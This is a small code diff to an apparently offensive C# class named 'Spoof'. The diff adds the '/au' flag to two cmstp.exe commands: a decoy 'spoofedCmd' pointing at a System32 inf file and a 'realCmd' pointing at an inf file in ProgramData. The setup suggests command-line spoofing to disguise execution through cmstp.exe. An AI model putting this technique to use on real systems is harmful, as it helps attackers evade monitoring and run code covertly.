@@ -109,8 +109,8 @@ public static class Spoof
 
     public static void Go()
     {
-        string spoofedCmd = "cmstp.exe /s C:\\Windows\\System32\\cmstp.inf";
-        string realCmd = "cmstp.exe /s C:\\ProgramData\\config.inf";
+        string spoofedCmd = "cmstp.exe /au /s C:\\Windows\\System32\\cmstp.inf";
+        string realCmd = "cmstp.exe /au /s C:\\ProgramData\\config.inf";
 
         STARTUPINFO si = new STARTUPINFO();
         si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
